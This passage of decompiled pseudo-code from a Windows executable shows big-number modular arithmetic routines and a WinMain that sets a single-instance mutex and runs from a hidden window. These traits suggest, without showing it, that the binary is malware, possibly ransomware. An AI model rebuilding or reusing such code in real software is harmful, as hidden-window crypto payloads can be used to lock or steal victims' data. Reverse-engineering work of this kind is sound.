  v23 = 0;
  v22 = 0;
  if ( !v3 )
  {
    qmemcpy(&a2, sub_402460(&a2, v24), 0x324u);
    v22 = 1;
  }
  if ( (STACK[0xFDC] & 0x80000000) != 0 )
  {
    qmemcpy(&STACK[0xCBC], sub_402460((int *)&STACK[0xCBC], v24), 0x324u);
    v23 = 1;
  }
  if ( sub_402B80((char *)&a2, (char *)&STACK[0xCBC]) )
  {
    v4 = 0;
    memset(a1 + 1, 0, 0x320u);
    *a1 = 1;
    v5 = a1 + 1;
    do
      *v5++ = v27[v4++];
    while ( v4 < *a1 );
    return a1;
  }
  else
  {
    if ( STACK[0xCBC] == 1 )
    {
      memset(v20, 0, 804);
      v20[0] = STACK[0xCBC];
      v7 = 0;
      v21 = v20;
      if ( (int)STACK[0xCBC] > 0 )
      {
        v8 = &v20[1];
        do
          *v8++ = *(&STACK[0xCC0] + v7++);
        while ( v7 < v20[0] );
      }
      memset(&v19[4], 0, 0x320u);
      *(_DWORD *)v19 = a2;
      v9 = 0;
      v21 = (int *)v19;
      if ( a2 > 0 )
      {
        v10 = &v19[4];
        do
          *v10++ = *(&a3 + v9++);
        while ( v9 < *(int *)v19 );
      }
      sub_4031E0(&v26, v25, *(int *)v19, *(int *)&v19[4]);
    }
    else
    {
      v20[200] = &v26;
      *(_DWORD *)&v19[800] = 0;
      v11 = 0;
      memset(v20, 0, 0x320u);
      *(_DWORD *)&v19[800] = STACK[0xCBC];
      v21 = (int *)&v19[800];
      if ( (int)STACK[0xCBC] > 0 )
      {
        v12 = v20;
        do
          *v12++ = *(&STACK[0xCC0] + v11++);
        while ( v11 < *(int *)&v19[800] );
      }
      memset(v19, 0, 0x320u);
      v18 = a2;
      v13 = 0;
      v21 = &v18;
      if ( a2 > 0 )
      {
        v14 = v19;
        do
          *v14++ = *(&a3 + v13++);
        while ( v13 < v18 );
      }
      sub_402C40(v18, v19[0]);
    }
    if ( v22 == v23 )
    {
      v15 = 0;
      memset(a1 + 1, 0, 0x320u);
      v16 = v26;
      *a1 = v26;
      if ( v16 > 0 )
      {
        v17 = a1 + 1;
        do
          *v17++ = v27[v15++];
        while ( v15 < *a1 );
      }
      return a1;
    }
    else
    {
      sub_402460(&v26, a1);
      return a1;
    }
  }
}
// 403390: using guessed type int var_32C[202];
// 403390: using guessed type int var_980[202];

//----- (00403640) --------------------------------------------------------
int *__cdecl sub_403640(int *a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // eax
  bool v5; // zf
  int *v6; // edx
  int v7; // eax
  _DWORD *v8; // ecx
  int v10; // eax
  _DWORD *v11; // ecx
  int v12; // eax
  _DWORD *v13; // ecx
  int v14; // eax
  _DWORD *v15; // ecx
  int v16; // eax
  _DWORD *v17; // ecx
  int *v18; // esi
  int v19; // eax
  int v20; // ecx
  _DWORD *v21; // ecx
  int v22; // [esp-64Ch] [ebp-FE8h] BYREF
  _BYTE v23[804]; // [esp-648h] [ebp-FE4h] BYREF
  _DWORD v24[205]; // [esp-324h] [ebp-CC0h] BYREF
  int *v25; // [esp+10h] [ebp-98Ch]
  int *v26; // [esp+14h] [ebp-988h]
  char v27; // [esp+1Bh] [ebp-981h]
  int v28[202]; // [esp+1Ch] [ebp-980h] BYREF
  int v29[202]; // [esp+344h] [ebp-658h] BYREF
  int v30; // [esp+66Ch] [ebp-330h] BYREF
  int v31[202]; // [esp+670h] [ebp-32Ch] BYREF

  v3 = a2;
  v25 = a1;
  v4 = 0;
  memset(&v29[1], 0, 0x320u);
  memset(v31, 0, 0x320u);
  v29[0] = 1;
  v30 = a2;
  if ( a2 > 0 )
  {
    do
    {
      v31[v4] = *(&a3 + v4);
      v3 = v30;
      ++v4;
    }
    while ( v4 < v30 );
  }
  v5 = (STACK[0xCC8] & 0x80000000) == 0;
  v27 = 0;
  if ( !v5 )
  {
    qmemcpy(&a2, sub_402460(&a2, v28), 0x324u);
    v27 = 1;
  }
  if ( (STACK[0xFEC] & 0x80000000) != 0 )
    qmemcpy(&STACK[0xCCC], sub_402460((int *)&STACK[0xCCC], v28), 0x324u);
  if ( !sub_402B80((char *)&a2, (char *)&STACK[0xCCC]) )
  {
    if ( STACK[0xCCC] == 1 )
    {
      memset(v24, 0, 804);
      v24[0] = STACK[0xCCC];
      v10 = 0;
      v26 = v24;
      if ( (int)STACK[0xCCC] > 0 )
      {
        v11 = &v24[1];
        do
          *v11++ = *(&STACK[0xCD0] + v10++);
        while ( v10 < v24[0] );
      }
      memset(&v23[4], 0, 0x320u);
      *(_DWORD *)v23 = a2;
      v12 = 0;
      v26 = (int *)v23;
      if ( a2 > 0 )
      {
        v13 = &v23[4];
        do
          *v13++ = *(&a3 + v12++);
        while ( v12 < *(int *)v23 );
      }
      sub_4031E0(v29, &v30, *(int *)v23, *(int *)&v23[4]);
    }
    else
    {
      v24[200] = v29;
      *(_DWORD *)&v23[800] = 0;
      v14 = 0;
      memset(v24, 0, 0x320u);
      *(_DWORD *)&v23[800] = STACK[0xCCC];
      v26 = (int *)&v23[800];
      if ( (int)STACK[0xCCC] > 0 )
      {
        v15 = v24;
        do
          *v15++ = *(&STACK[0xCD0] + v14++);
        while ( v14 < *(int *)&v23[800] );
      }
      memset(v23, 0, 0x320u);
      v22 = a2;
      v16 = 0;
      v26 = &v22;
      if ( a2 > 0 )
      {
        v17 = v23;
        do
          *v17++ = *(&a3 + v16++);
        while ( v16 < v22 );
      }
      sub_402C40(v22, v23[0]);
    }
    if ( v27 )
    {
      v18 = v25;
      sub_402460(&v30, v25);
      return v18;
    }
    v6 = v25;
    v19 = 0;
    memset(v25 + 1, 0, 0x320u);
    v20 = v30;
    *v6 = v30;
    if ( v20 > 0 )
    {
      v21 = v6 + 1;
      do
        *v21++ = v31[v19++];
      while ( v19 < *v6 );
    }
    return v6;
  }
  v6 = v25;
  v7 = 0;
  memset(v25 + 1, 0, 0x320u);
  *v25 = v3;
  if ( v3 <= 0 )
    return v6;
  v8 = v6 + 1;
  do
    *v8++ = v31[v7++];
  while ( v7 < *v6 );
  return v6;
}
// 403640: using guessed type int var_32C[202];
// 403640: using guessed type int var_980[202];

//----- (00403930) --------------------------------------------------------
int *__userpurge sub_403930@<eax>(
        int *a1@<ecx>,
        int *a2,
        int a3,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  bool v66; // zf
  unsigned int v67; // eax
  int v68; // eax
  _DWORD *v69; // ecx
  int *v70; // eax
  int v71; // eax
  _DWORD *v72; // ecx
  int v73; // eax
  int v74; // ecx
  int *v75; // eax
  unsigned int v76; // eax
  int v77; // ebx
  int v78; // eax
  _DWORD *v79; // ecx
  int v80; // eax
  int *v81; // ecx
  int *v82; // esi
  int v83; // eax
  unsigned int v84; // edx
  int i; // ecx
  int v86; // eax
  _DWORD *v87; // ecx
  int v88; // eax
  int *v89; // ecx
  int v90; // eax
  _DWORD *v91; // ecx
  int v92; // eax
  int *v93; // ecx
  int v94; // eax
  _DWORD *v95; // ecx
  int v96; // eax
  int *v97; // ecx
  int v98; // eax
  _DWORD *v99; // ecx
  int v100; // eax
  int *v101; // ecx
  int *v102; // edx
  int v103; // eax
  int v104; // ecx
  _DWORD *v105; // ecx
  int *v107; // esi
  int v108; // eax
  int v109; // ecx
  _DWORD *v110; // ecx
  int v111; // [esp-FB4h] [ebp-1C90h] BYREF
  int v112[200]; // [esp-FB0h] [ebp-1C8Ch] BYREF
  int v113; // [esp-C90h] [ebp-196Ch] BYREF
  _BYTE v114[800]; // [esp-C8Ch] [ebp-1968h] BYREF
  int v115; // [esp-96Ch] [ebp-1648h] BYREF
  char v116; // [esp-968h] [ebp-1644h]
  int v117; // [esp-964h] [ebp-1640h]
  int v118; // [esp-960h] [ebp-163Ch]
  int v119; // [esp-95Ch] [ebp-1638h]
  int v120; // [esp-958h] [ebp-1634h]
  int v121; // [esp-954h] [ebp-1630h]
  int v122; // [esp-950h] [ebp-162Ch]
  int v123; // [esp-94Ch] [ebp-1628h]
  int v124; // [esp-948h] [ebp-1624h]
  int v125; // [esp-944h] [ebp-1620h]
  int v126; // [esp-940h] [ebp-161Ch]
  int v127; // [esp-93Ch] [ebp-1618h]
  int v128; // [esp-938h] [ebp-1614h]
  int v129; // [esp-934h] [ebp-1610h]
  int v130; // [esp-930h] [ebp-160Ch]
  int v131; // [esp-92Ch] [ebp-1608h]
  int v132; // [esp-928h] [ebp-1604h]
  int v133; // [esp-924h] [ebp-1600h]
  int v134; // [esp-920h] [ebp-15FCh]
  int v135; // [esp-91Ch] [ebp-15F8h]
  int v136; // [esp-918h] [ebp-15F4h]
  int v137; // [esp-914h] [ebp-15F0h]
  int v138; // [esp-910h] [ebp-15ECh]
  int v139; // [esp-90Ch] [ebp-15E8h]
  int v140; // [esp-908h] [ebp-15E4h]
  int v141; // [esp-904h] [ebp-15E0h]
  int v142; // [esp-900h] [ebp-15DCh]
  int v143; // [esp-8FCh] [ebp-15D8h]
  int v144; // [esp-8F8h] [ebp-15D4h]
  int v145; // [esp-8F4h] [ebp-15D0h]
  int v146; // [esp-8F0h] [ebp-15CCh]
  int v147; // [esp-8ECh] [ebp-15C8h]
  int v148; // [esp-8E8h] [ebp-15C4h]
  int v149; // [esp-8E4h] [ebp-15C0h]
  int v150; // [esp-8E0h] [ebp-15BCh]
  int v151; // [esp-8DCh] [ebp-15B8h]
  int v152; // [esp-8D8h] [ebp-15B4h]
  int v153; // [esp-8D4h] [ebp-15B0h]
  int v154; // [esp-8D0h] [ebp-15ACh]
  int v155; // [esp-8CCh] [ebp-15A8h]
  int v156; // [esp-8C8h] [ebp-15A4h]
  int v157; // [esp-8C4h] [ebp-15A0h]
  int v158; // [esp-8C0h] [ebp-159Ch]
  int v159; // [esp-8BCh] [ebp-1598h]
  int v160; // [esp-8B8h] [ebp-1594h]
  int v161; // [esp-8B4h] [ebp-1590h]
  int v162; // [esp-8B0h] [ebp-158Ch]
  int v163; // [esp-8ACh] [ebp-1588h]
  int v164; // [esp-8A8h] [ebp-1584h]
  int v165; // [esp-8A4h] [ebp-1580h]
  int v166; // [esp-8A0h] [ebp-157Ch]
  int v167; // [esp-89Ch] [ebp-1578h]
  int v168; // [esp-898h] [ebp-1574h]
  int v169; // [esp-894h] [ebp-1570h]
  int v170; // [esp-890h] [ebp-156Ch]
  int v171; // [esp-88Ch] [ebp-1568h]
  int v172; // [esp-888h] [ebp-1564h]
  int v173; // [esp-884h] [ebp-1560h]
  int v174; // [esp-880h] [ebp-155Ch]
  int v175; // [esp-87Ch] [ebp-1558h]
  int v176; // [esp-878h] [ebp-1554h]
  int v177; // [esp-648h] [ebp-1324h] BYREF
  int v178[200]; // [esp-644h] [ebp-1320h] BYREF
  int v179; // [esp-324h] [ebp-1000h] BYREF
  _BYTE v180[812]; // [esp-320h] [ebp-FFCh] BYREF
  int v181; // [esp+Ch] [ebp-CD0h]
  int v182; // [esp+10h] [ebp-CCCh]
  int v183; // [esp+14h] [ebp-CC8h]
  char *v184; // [esp+18h] [ebp-CC4h]
  int v185; // [esp+1Ch] [ebp-CC0h]
  int *v186; // [esp+20h] [ebp-CBCh]
  int *v187; // [esp+24h] [ebp-CB8h]
  int *v188; // [esp+28h] [ebp-CB4h]
  char v189; // [esp+2Fh] [ebp-CADh]
  int v190[202]; // [esp+30h] [ebp-CACh] BYREF
  int v191[202]; // [esp+358h] [ebp-984h] BYREF
  int v192[202]; // [esp+680h] [ebp-65Ch] BYREF
  int v193[203]; // [esp+9A8h] [ebp-334h] BYREF

  v186 = a2;
  memset(v193, 0, 804);
  v193[1] = 1;
  if ( !++v193[0] )
    v193[0] = 1;
  v66 = a1[200] >= 0;
  v179 = 0;
  memset(v180, 0, 0x320u);
  v67 = STACK[0x100C];
  v189 = 0;
  v187 = &v179;
  v179 = v67;
  if ( v66 )
  {
    v71 = 0;
    if ( (int)STACK[0x100C] > 0 )
    {
      v72 = v180;
      do
        *v72++ = *(&STACK[0x1010] + v71++);
      while ( v71 < v179 );
    }
    v177 = 0;
    memset(v178, 0, sizeof(v178));
    v73 = *a1;
    v74 = 0;
    v187 = &v177;
    v177 = v73;
    if ( v73 > 0 )
    {
      v75 = v178;
      do
      {
        *v75 = *(int *)((char *)v75 + (char *)a1 - (char *)&v177);
        ++v74;
        ++v75;
      }
      while ( v74 < v177 );
    }
    v70 = sub_403640(v192, v177, v178[0]);
  }
  else
  {
    v68 = 0;
    if ( (int)STACK[0x100C] > 0 )
    {
      v69 = v180;
      do
        *v69++ = *(&STACK[0x1010] + v68++);
      while ( v68 < v179 );
    }
    v187 = &v177;
    sub_402460(a1, &v177);
    v70 = sub_403640(v192, v177, v178[0]);
    v189 = 1;
  }
  v66 = (STACK[0x132C] & 0x80000000) == 0;
  qmemcpy(v191, v70, 0x324u);
  if ( !v66 )
    qmemcpy(&STACK[0x100C], sub_402460((int *)&STACK[0x100C], v192), 0x324u);
  memset(&v192[1], 0, 0x320u);
  v76 = 2 * STACK[0x100C];
  v192[v76 + 1] = 1;
  v77 = v76 + 1;
  v179 = 0;
  memset(v180, 0, 0x320u);
  v179 = STACK[0x100C];
  v78 = 0;
  v192[0] = v77;
  v187 = &v179;
  if ( (int)STACK[0x100C] > 0 )
  {
    v79 = v180;
    do
      *v79++ = *(&STACK[0x1010] + v78++);
    while ( v78 < v179 );
  }
  v80 = 0;
  memset(v178, 0, sizeof(v178));
  v187 = &v177;
  v177 = v77;
  if ( v77 > 0 )
  {
    v81 = v178;
    do
      *v81++ = v192[++v80];
    while ( v80 < v177 );
  }
  v82 = sub_403390(v190, v177, v178[0]);
  v83 = a3;
  qmemcpy(v192, v82, 0x324u);
  if ( a3 > 1 )
  {
    do
    {
      if ( *(&a3 + v83) )
        break;
      a3 = --v83;
    }
    while ( v83 > 1 );
  }
  v84 = 0x80000000;
  for ( i = 32; i > 0; --i )
  {
    if ( (v84 & *(&a3 + v83)) != 0 )
      break;
    v84 >>= 1;
  }
  v187 = (int *)(32 * v83 + i - 32);
  v181 = 0;
  v183 = 0;
  if ( v83 > 0 )
  {
    v184 = &a4;
LABEL_33:
    v185 = 1;
    v182 = 0;
    while ( 1 )
    {
      if ( (v185 & *(_DWORD *)v184) != 0 )
      {
        v86 = 0;
        memset(v180, 0, 0x320u);
        v188 = &v179;
        v179 = v192[0];
        if ( v192[0] > 0 )
        {
          v87 = v180;
          do
            *v87++ = v192[++v86];
          while ( v86 < v179 );
        }
        v177 = 0;
        memset(v178, 0, sizeof(v178));
        v177 = STACK[0x100C];
        v88 = 0;
        v188 = &v177;
        if ( (int)STACK[0x100C] > 0 )
        {
          v89 = v178;
          do
            *v89++ = *(&STACK[0x1010] + v88++);
          while ( v88 < v177 );
        }
        v90 = 0;
        memset(v114, 0, sizeof(v114));
        v188 = &v113;
        v113 = v191[0];
        if ( v191[0] > 0 )
        {
          v91 = v114;
          do
            *v91++ = v191[++v90];
          while ( v90 < v113 );
        }
        v92 = 0;
        memset(v112, 0, sizeof(v112));
        v188 = &v111;
        v111 = v193[0];
        if ( v193[0] > 0 )
        {
          v93 = v112;
          do
            *v93++ = v193[++v92];
          while ( v92 < v111 );
        }
        sub_4025C0(&v115, v111, v112[0]);
        qmemcpy(
          v193,
          sub_404010(
            v190,
            v115,
            v116,
            v117,
            v118,
            v119,
            v120,
            v121,
            v122,
            v123,
            v124,
            v125,
            v126,
            v127,
            v128,
            v129,
            v130,
            v131,
            v132,
            v133,
            v134,
            v135,
            v136,
            v137,
            v138,
            v139,
            v140,
            v141,
            v142,
            v143,
            v144,
            v145,
            v146,
            v147,
            v148,
            v149,
            v150,
            v151,
            v152,
            v153,
            v154,
            v155,
            v156,
            v157,
            v158,
            v159,
            v160,
            v161,
            v162,
            v163,
            v164,
            v165,
            v166,
            v167,
            v168,
            v169,
            v170,
            v171,
            v172,
            v173,
            v174,
            v175,
            v176),
          0x324u);
      }
      v185 *= 2;
      v94 = 0;
      memset(v180, 0, 0x320u);
      v188 = &v179;
      v179 = v192[0];
      if ( v192[0] > 0 )
      {
        v95 = v180;
        do
          *v95++ = v192[++v94];
        while ( v94 < v179 );
      }
      v177 = 0;
      memset(v178, 0, sizeof(v178));
      v177 = STACK[0x100C];
      v96 = 0;
      v188 = &v177;
      if ( (int)STACK[0x100C] > 0 )
      {
        v97 = v178;
        do
          *v97++ = *(&STACK[0x1010] + v96++);
        while ( v96 < v177 );
      }
      v98 = 0;
      memset(v114, 0, sizeof(v114));
      v188 = &v113;
      v113 = v191[0];
      if ( v191[0] > 0 )
      {
        v99 = v114;
        do
          *v99++ = v191[++v98];
        while ( v98 < v113 );
      }
      v100 = 0;
      memset(v112, 0, sizeof(v112));
      v188 = &v111;
      v111 = v191[0];
      if ( v191[0] > 0 )
      {
        v101 = v112;
        do
          *v101++ = v191[++v100];
        while ( v100 < v111 );
      }
      sub_4025C0(&v115, v111, v112[0]);
      qmemcpy(
        v191,
        sub_404010(
          v190,
          v115,
          v116,
          v117,
          v118,
          v119,
          v120,
          v121,
          v122,
          v123,
          v124,
          v125,
          v126,
          v127,
          v128,
          v129,
          v130,
          v131,
          v132,
          v133,
          v134,
          v135,
          v136,
          v137,
          v138,
          v139,
          v140,
          v141,
          v142,
          v143,
          v144,
          v145,
          v146,
          v147,
          v148,
          v149,
          v150,
          v151,
          v152,
          v153,
          v154,
          v155,
          v156,
          v157,
          v158,
          v159,
          v160,
          v161,
          v162,
          v163,
          v164,
          v165,
          v166,
          v167,
          v168,
          v169,
          v170,
          v171,
          v172,
          v173,
          v174,
          v175,
          v176),
        0x324u);
      if ( v191[0] == 1 && v191[1] == 1 )
        break;
      if ( (int *)++v181 != v187 && ++v182 < 32 )
        continue;
      v184 += 4;
      if ( ++v183 < a3 )
        goto LABEL_33;
      goto LABEL_65;
    }
    if ( v189 && (a4 & 1) != 0 )
      goto LABEL_73;
    v102 = v186;
    v108 = 0;
    memset(v186 + 1, 0, 0x320u);
    v109 = v193[0];
    *v102 = v193[0];
    if ( v109 > 0 )
    {
      v110 = v102 + 1;
      do
        *v110++ = v193[++v108];
      while ( v108 < *v102 );
    }
    return v102;
  }
LABEL_65:
  if ( !v189 || (a4 & 1) == 0 )
  {
    v102 = v186;
    v103 = 0;
    memset(v186 + 1, 0, 0x320u);
    v104 = v193[0];
    *v102 = v193[0];
    if ( v104 > 0 )
    {
      v105 = v102 + 1;
      do
        *v105++ = v193[++v103];
      while ( v103 < *v102 );
    }
    return v102;
  }
LABEL_73:
  v107 = v186;
  sub_402460(v193, v186);
  return v107;
}
// 403975: conditional instruction was optimized away because eax.4==0
// 403930: too many input arguments, some ignored
// 403930: using guessed type int var_CAC[202];

//----- (00404010) --------------------------------------------------------
int *__userpurge sub_404010@<eax>(
        int *a1,
        int a2,
        char a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  unsigned int v64; // edx
  unsigned int v65; // ecx
  signed int v66; // edx
  int v67; // esi
  signed int v68; // eax
  _DWORD *v69; // ecx
  int v70; // eax
  int *v71; // ecx
  int v72; // ebx
  int v73; // eax
  int *v74; // esi
  int *v75; // edx
  int v76; // eax
  int v77; // esi
  unsigned __int64 v78; // rax
  int v79; // edi
  int v80; // ecx
  int v81; // eax
  int *v82; // ebx
  int v83; // eax
  int v84; // edx
  int v85; // eax
  int *v86; // ecx
  int v87; // ecx
  unsigned int v88; // eax
  int v89; // eax
  int *j; // ecx
  int v92; // [esp-648h] [ebp-CD0h] BYREF
  int v93[200]; // [esp-644h] [ebp-CCCh] BYREF
  signed int v94; // [esp-324h] [ebp-9ACh] BYREF
  _BYTE v95[816]; // [esp-320h] [ebp-9A8h] BYREF
  unsigned int v96; // [esp+10h] [ebp-678h]
  int v97; // [esp+1Ch] [ebp-66Ch]
  int *v98; // [esp+20h] [ebp-668h]
  int v99; // [esp+24h] [ebp-664h]
  int v100; // [esp+28h] [ebp-660h]
  int *v101; // [esp+2Ch] [ebp-65Ch]
  int i; // [esp+30h] [ebp-658h] BYREF
  int v103[201]; // [esp+34h] [ebp-654h] BYREF
  int v104; // [esp+358h] [ebp-330h] BYREF
  int v105[202]; // [esp+35Ch] [ebp-32Ch] BYREF

  v64 = STACK[0x9B8];
  v65 = STACK[0x9B8] + 1;
  v101 = a1;
  v100 = v65;
  memset(v105, 0, 0x320u);
  v66 = v64 - 1;
  if ( v66 < a2 )
    qmemcpy(v105, &a3 + 4 * v66, 4 * (a2 - v66));
  v67 = a2 - v66;
  v104 = a2 - v66;
  if ( a2 - v66 <= 0 )
  {
    v67 = 1;
    v104 = 1;
  }
  v94 = 0;
  memset(v95, 0, 0x320u);
  v94 = STACK[0xCDC];
  v68 = 0;
  v98 = &v94;
  if ( (int)STACK[0xCDC] > 0 )
  {
    v69 = v95;
    do
      *v69++ = *(&STACK[0xCE0] + v68++);
    while ( v68 < v94 );
  }
  v70 = 0;
  memset(v93, 0, sizeof(v93));
  v98 = &v92;
  v92 = v67;
  if ( v67 > 0 )
  {
    v71 = v93;
    do
      *v71++ = v105[v70++];
    while ( v70 < v92 );
  }
  sub_4025C0(&i, v92, v93[0]);
  v72 = v100;
  memset(v105, 0, 0x320u);
  v73 = i;
  if ( v100 < i )
    qmemcpy(v105, &v103[v100], 4 * (i - v100));
  v104 = v73 - v72;
  if ( v73 - v72 <= 0 )
    v104 = 1;
  v74 = v101;
  v75 = v101 + 1;
  memset(v101 + 1, 0, 0x320u);
  v76 = a2;
  v98 = v75;
  *v74 = 1;
  if ( a2 > v72 )
    v76 = v72;
  if ( v76 > 0 )
  {
    qmemcpy(v75, &a3, 4 * v76);
    v74 = v101;
  }
  *v74 = v76;
  v77 = 0;
  memset(v103, 0, 0x320u);
  i = 1;
  v99 = 0;
  if ( v104 > 0 )
  {
    LODWORD(v78) = STACK[0x9B8];
    do
    {
      v79 = v105[v77];
      v97 = v79;
      if ( v79 )
      {
        HIDWORD(v78) = 0;
        v80 = 0;
        v96 = 0;
        if ( (int)v78 <= 0 )
        {
LABEL_27:
          if ( v77 < v72 )
            v103[v77] = HIDWORD(v78);
        }
        else
        {
          while ( v77 < v72 )
          {
            v72 = v100;
            v78 = v96 + (unsigned int)v103[v77] + (unsigned int)v79 * (unsigned __int64)*(&STACK[0x9BC] + v80);
            v103[v77] = v78;
            LODWORD(v78) = STACK[0x9B8];
            ++v80;
            ++v77;
            v96 = HIDWORD(v78);
            if ( v80 >= (int)v78 )
              goto LABEL_27;
            v79 = v97;
          }
        }
        v77 = v99;
      }
      v99 = ++v77;
    }
    while ( v77 < v104 );
  }
  v81 = v72;
  for ( i = v72; v81 > 1; i = --v81 )
  {
    if ( v103[v81 - 1] )
      break;
  }
  sub_4023E0(v101, (char *)&v104, &i);
  v82 = v101;
  if ( v101[200] < 0 )
  {
    memset(v105, 0, 0x320u);
    v83 = v100;
    v105[v100] = 1;
    v104 = v83 + 1;
    qmemcpy(v82, sub_402240(&v104, (char *)&i, v82), 0x324u);
  }
  while ( 1 )
  {
    v84 = *v82;
    if ( *v82 == STACK[0x9B8] )
    {
      v85 = 0;
      if ( v84 <= 0 )
        goto LABEL_54;
      v86 = v98;
      while ( *v86 == *(&STACK[0x9BC] + v85) )
      {
        ++v85;
        ++v86;
        if ( v85 >= v84 )
          goto LABEL_54;
      }
    }
    v87 = STACK[0xCD8];
    if ( v82[200] < 0 && v87 >= 0 )
      return v82;
    if ( (v82[200] & 0x80000000) != 0 || v87 >= 0 )
    {
      v88 = *v82;
      if ( v84 <= (int)STACK[0x9B8] )
        v88 = STACK[0x9B8];
      v89 = v88 - 1;
      if ( v89 < 0 )
        return v82;
      for ( j = &v82[v89 + 1]; *j == *(&STACK[0x9BC] + v89); --j )
      {
        if ( --v89 < 0 )
          return v82;
      }
      if ( v82[v89 + 1] <= *(&STACK[0x9BC] + v89) )
        return v82;
    }
LABEL_54:
    sub_4023E0(v82, (char *)&v104, &STACK[0x9B8]);
    v82 = v101;
  }
}
// 40438B: conditional instruction was optimized away because eax.4>=0
// 404010: too many input arguments, some ignored
// 404010: using guessed type int var_32C[202];
// 404010: using guessed type int var_654[201];

//----- (004043C0) --------------------------------------------------------
int __userpurge sub_4043C0@<eax>(int *a1@<eax>, _BYTE *a2@<edi>, int Size)
{
  int v4; // eax
  unsigned int v5; // ecx
  int i; // eax
  int v7; // eax
  unsigned int v8; // ebx
  int v9; // eax
  char v10; // cl
  int v11; // edx
  _BYTE *v12; // ecx
  int *v13; // esi
  unsigned int v14; // eax
  int v16; // [esp+4h] [ebp-4h]

  if ( *a1 > 1 )
  {
    do
    {
      if ( a1[*a1] )
        break;
      v4 = *a1 - 1;
      *a1 = v4;
    }
    while ( v4 > 1 );
  }
  v5 = 0x80000000;
  for ( i = 32; i > 0; --i )
  {
    if ( (v5 & a1[*a1]) != 0 )
      break;
    v5 >>= 1;
  }
  v7 = 32 * *a1 + i - 32;
  v16 = v7 >> 3;
  if ( (v7 & 7) != 0 )
    v16 = (v7 >> 3) + 1;
  if ( Size > 0 )
    memset(a2, 0, Size);
  v8 = a1[*a1];
  v9 = 0;
  v10 = 0;
  if ( HIBYTE(v8) )
  {
    v9 = 1;
    *a2 = HIBYTE(v8);
    v10 = 1;
  }
  if ( v10 || BYTE2(v8) )
  {
    a2[v9++] = BYTE2(v8);
    v10 = 1;
  }
  if ( v10 || BYTE1(v8) )
  {
    a2[v9++] = BYTE1(v8);
    v10 = 1;
  }
  if ( v10 || (_BYTE)v8 )
    a2[v9++] = v8;
  v11 = *a1 - 2;
  if ( v11 >= 0 )
  {
    v12 = &a2[v9 + 2];
    v13 = &a1[v11 + 1];
    do
    {
      v14 = *v13;
      v12[1] = *v13;
      v14 >>= 8;
      *v12 = v14;
      v14 >>= 8;
      *(v12 - 1) = v14;
      *(v12 - 2) = BYTE1(v14);
      --v13;
      v12 += 4;
      --v11;
    }
    while ( v11 >= 0 );
  }
  return v16;
}

//----- (004044C0) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  int SystemMetrics; // eax
  HWND Window; // esi
  int v7; // [esp-1Ch] [ebp-604h]
  WNDCLASSW WndClass; // [esp+10h] [ebp-5D8h] BYREF
  char v9[1420]; // [esp+38h] [ebp-5B0h] BYREF
  WCHAR ClassName[8]; // [esp+5C4h] [ebp-24h] BYREF
  WCHAR WindowName[8]; // [esp+5D4h] [ebp-14h] BYREF

  if ( CreateMutexW(0, 0, L"XVFXGW DOUBLE SET") )
  {
    if ( GetLastError() != 183 )
    {
      wcscpy(ClassName, L"window");
      wcscpy(WindowName, L"window");
      WndClass.style = 0;
      WndClass.lpfnWndProc = (WNDPROC)sub_404640;
      WndClass.cbClsExtra = 0;
      WndClass.cbWndExtra = 0;
      WndClass.hInstance = hInstance;
      WndClass.hIcon = 0;
      WndClass.hCursor = LoadCursorW(0, (LPCWSTR)0x7F00);
      WndClass.hbrBackground = (HBRUSH)GetStockObject(0);
      WndClass.lpszMenuName = 0;
      WndClass.lpszClassName = ClassName;
      if ( RegisterClassW(&WndClass) )
      {
        v7 = GetSystemMetrics(1) / 2 - 48;
        SystemMetrics = GetSystemMetrics(0);
        Window = CreateWindowExW(
                   0,
                   ClassName,
                   WindowName,
                   0xCF0000u,
                   SystemMetrics / 2 - 160,
                   v7,
                   320,
                   96,
                   0,
                   0,
                   hInstance,
                   0);
        SetWindowLongW(Window, -16, 0);
        ShowWindow(Window, 0);
        sub_404A50((int)v9);
        sub_4057B0(v9);
        HeapSetInformation(0, HeapEnableTerminationOnCorruption, 0, 0);
      }
    }
  }
  return 0;
}

//----- (00404640) --------------------------------------------------------
int __stdcall sub_404640(int a1, int a2, int a3, int a4)
{
  return 0;
}

//----- (00404650) --------------------------------------------------------
int *__usercall sub_404650@<eax>(int *a1@<esi>, void *a2, int a3, int a4, int a5, int a6, unsigned int a7)
{
  int v7; // edx
  int v8; // eax
  int v9; // edi
  _BYTE *v10; // ecx
  _BYTE *v11; // eax
  _BYTE *v12; // eax
  unsigned __int8 v13; // bl
  _BYTE *v14; // eax
  int i; // edi
  int v16; // edx
  int v17; // eax
  char v18; // bl
  unsigned int v19; // edi
  unsigned int v20; // ecx
  bool v21; // zf
  _BYTE *v22; // eax
  int *v23; // eax
  bool v24; // cf
  int *v25; // eax
  int j; // edi
  int v27; // edx
  int v28; // eax
  char v29; // bl
  unsigned int v30; // edi
  unsigned int v31; // ecx
  bool v32; // zf
  _BYTE *v33; // eax
  _BYTE *v34; // eax
  _BYTE *v35; // eax
